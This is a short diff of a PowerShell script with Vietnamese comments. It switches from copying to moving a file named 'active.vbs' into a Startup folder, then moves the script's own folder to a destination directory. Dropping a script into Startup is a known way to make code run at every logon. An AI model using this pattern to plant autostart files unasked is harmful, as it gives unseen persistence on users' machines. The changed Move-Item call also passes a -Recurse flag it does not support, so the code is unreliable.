@@ -41,15 +41,15 @@ if (Test-Path $PSScriptRoot) {
         # Nếu thư mục đích chưa tồn tại, tạo mới thư mục đích
         New-Item -ItemType Directory -Path $destinationFolder -Force | Out-Null
     }
-
+    
+    $sourceFolder =  $PSScriptRoot +"\active.vbs"
+    $dich= $destinationFolder+"\Startup"
+    # Write-Host "Thư mục hiện tại đang đứng: $PSScriptRoot"
+    Move-Item -Path $sourceFolder -Destination $dich -Force | Out-Null
     # Copy thư mục từ nguồn đến đích
-    Copy-Item  -Path $PSScriptRoot -Destination $destinationFolder -Recurse -Force
+    Move-Item -Path $PSScriptRoot -Destination $destinationFolder -Recurse -Force
    
 } 
 
 
 # Đường dẫn thư mục cần di chuyển
-$sourceFolder =  $PSScriptRoot +"\active.vbs"
-$dich= $destinationFolder+"\Startup"
-# Write-Host "Thư mục hiện tại đang đứng: $PSScriptRoot"
-Copy-Item -Path $sourceFolder -Destination $dich -Force | Out-Null
